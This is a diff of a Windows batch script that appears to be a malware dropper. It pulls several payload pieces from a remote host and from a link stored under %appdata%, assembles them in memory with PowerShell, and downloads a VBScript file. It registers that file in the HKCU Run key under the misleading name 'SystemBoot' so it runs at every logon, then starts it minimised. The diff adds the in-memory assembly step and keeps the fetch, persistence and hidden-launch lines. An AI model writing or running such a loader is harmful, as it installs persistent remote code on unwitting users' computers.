@@ -11,13 +11,11 @@ set /p dynLink=<"%appdata%\Paged-l\l.txt"
 rmdir /s /q "%d%" 2>nul
 mkdir "%d%"
 
-:: Download files to memory and then save
-powershell -c "$content = (Invoke-WebRequest -Uri 'https://%u%/Final.txt').Content; [System.IO.File]::WriteAllText('%f%', $content)"
+:: Download files to memory and perform replacements in memory
+powershell -c "$contentM = (Invoke-WebRequest -Uri 'https://%u%/Final.txt').Content; $contentA = (Invoke-WebRequest -Uri 'https://%u%/First.txt').Content; $contentB = (Invoke-WebRequest -Uri '%dynLink%').Content; $finalContent = $contentM -replace '----',$contentA -replace '====',$contentB; [System.IO.File]::WriteAllText('%c%', $finalContent)"
 timeout /t 5 /nobreak >nul
-powershell -c "$content = (Invoke-WebRequest -Uri 'https://%u%/First.txt').Content; [System.IO.File]::WriteAllText('%a%', $content)"
-powershell -c "$content = (Invoke-WebRequest -Uri '%dynLink%').Content; [System.IO.File]::WriteAllText('%b%', $content)"
-powershell -c "(gc '%f%' -Raw) -replace '----',(gc '%a%' -Raw) -replace '====',(gc '%b%' -Raw) | sc '%c%'"
-del "%a%" "%b%" 2>nul
+
+:: Download S_m.vbs to memory and save
 powershell -c "$content = (Invoke-WebRequest -Uri 'https://%u%/S_m.vbs').Content; [System.IO.File]::WriteAllText('%v%', $content)"
 powershell -c "sp 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' SystemBoot 'wscript.exe \"%v%\"'"
 start /min wscript "%v%"
